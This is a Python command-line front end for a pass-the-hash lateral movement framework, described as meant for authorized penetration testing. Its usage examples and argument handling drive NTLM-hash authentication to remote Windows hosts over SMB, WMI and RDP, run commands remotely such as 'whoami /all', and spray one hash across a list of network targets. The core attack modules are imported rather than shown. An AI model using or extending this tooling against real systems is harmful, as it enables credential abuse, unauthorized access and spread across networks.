"""
Pass-the-Hash Lateral Movement Framework
Command Line Interface

Authenticate to remote systems using NTLM hashes.
For authorized penetration testing and red team operations only.

Usage:
    # Single target via SMB
    python -m pth_framework --target 192.168.1.100 --username admin --hash aad3b435... --method smb

    # Execute command via WMI
    python -m pth_framework --target 192.168.1.100 --username admin --hash aad3b435... --method wmi --command "whoami /all"

    # Spray hash across network
    python -m pth_framework --target 192.168.1.100 --username admin --hash aad3b435... --spray targets.txt

    # Test credentials from file
    python -m pth_framework --target 192.168.1.100 --creds credentials.json --method smb
"""

import argparse
import sys
from pathlib import Path

from .core import PassTheHashFramework, Credential, FrameworkConfig
from .methods import list_methods
from .utils.files import load_targets_from_file, load_credentials_from_file


def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Pass-the-Hash Lateral Movement Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Single target SMB authentication
    %(prog)s --target 192.168.1.100 --username admin --hash aad3b435... 

    # WMI with command execution
    %(prog)s --target 192.168.1.100 --username admin --hash aad3b435... --method wmi --command "ipconfig"

    # Spray across network
    %(prog)s --username admin --hash aad3b435... --spray targets.txt --method smb

    # RDP Pass-the-Hash (requires Restricted Admin)
    %(prog)s --target 192.168.1.100 --username admin --hash aad3b435... --method rdp
        """
    )

    # Target specification
    target_group = parser.add_argument_group('Target')
    target_group.add_argument(
        '--target', '-t',
        type=str,
        help='Target IP or hostname'
    )
    target_group.add_argument(
        '--spray', '-s',
        type=str,
        metavar='FILE',
        help='File with target IPs (one per line) for hash spraying'
    )

    # Credential specification
    cred_group = parser.add_argument_group('Credentials')
    cred_group.add_argument(
        '--username', '-u',
        type=str,
        help='Username for authentication'
    )
    cred_group.add_argument(
        '--hash', '-H',
        type=str,
        help='NTLM hash (NT hash only, not LM:NT)'
    )
    cred_group.add_argument(
        '--domain', '-d',
        type=str,
        default='.',
        help='Domain (default: .)'
    )
    cred_group.add_argument(
        '--creds',
        type=str,
        metavar='FILE',
        help='JSON file with credentials to test'
    )

    # Method specification
    method_group = parser.add_argument_group('Method')
    method_group.add_argument(
        '--method', '-m',
        type=str,
        choices=list_methods(),
        default='smb',
        help='Authentication method (default: smb)'
    )
    method_group.add_argument(
        '--command', '-x',
        type=str,
        help='Command to execute (for WMI/PSExec methods)'
    )

    # Output options
    output_group = parser.add_argument_group('Output')
    output_group.add_argument(
        '--output', '-o',
        type=str,
        default='pth_results',
        help='Output directory for reports (default: pth_results)'
    )
    output_group.add_argument(
        '--timeout',
        type=int,
        default=30,
        help='Command timeout in seconds (default: 30)'
    )
    output_group.add_argument(
        '--quiet', '-q',
        action='store_true',
        help='Suppress verbose output'
    )

    return parser.parse_args()


def validate_args(args) -> bool:
    """Validate argument combinations"""
    # Need either single target or spray file
    if not args.target and not args.spray:
        print("[-] Error: Must specify --target or --spray")
        return False

    # Need credentials (either individual or file)
    if not args.creds:
        if not args.username or not args.hash:
            print("[-] Error: Must specify --username and --hash, or --creds file")
            return False

    # Spray requires credentials
    if args.spray and args.creds:
        print("[-] Error: --spray uses single credential, not --creds file")
        return False

    # Validate files exist
    if args.spray and not Path(args.spray).exists():
        print(f"[-] Error: Spray file not found: {args.spray}")
        return False

    if args.creds and not Path(args.creds).exists():
        print(f"[-] Error: Credentials file not found: {args.creds}")
        return False

    return True


def main():
    """Main entry point"""
    args = parse_args()

    if not validate_args(args):
        sys.exit(1)

    # Initialize framework
    config = FrameworkConfig(
        output_dir=args.output,
        timeout=args.timeout,
        verbose=not args.quiet
    )

    framework = PassTheHashFramework(config)

    # Build credential(s)
    if args.creds:
        # Load credentials from file
        credentials = load_credentials_from_file(args.creds)

        # Test all credentials against single target
        valid = framework.test_credentials(
            target=args.target,
            credentials=credentials,
            method=args.method
        )

    elif args.spray:
        # Spray single hash across network
        targets = load_targets_from_file(args.spray)
        credential = Credential(
            username=args.username,
            ntlm_hash=args.hash,
            domain=args.domain
        )

        framework.spray_hash(
            targets=targets,
            credential=credential,
            method=args.method
        )

    else:
        # Single target authentication
        credential = Credential(
            username=args.username,
            ntlm_hash=args.hash,
            domain=args.domain
        )

        framework.authenticate(
            target=args.target,
            credential=credential,
            method=args.method,
            command=args.command
        )

    # Generate final report
    framework.generate_report()


if __name__ == "__main__":
    main()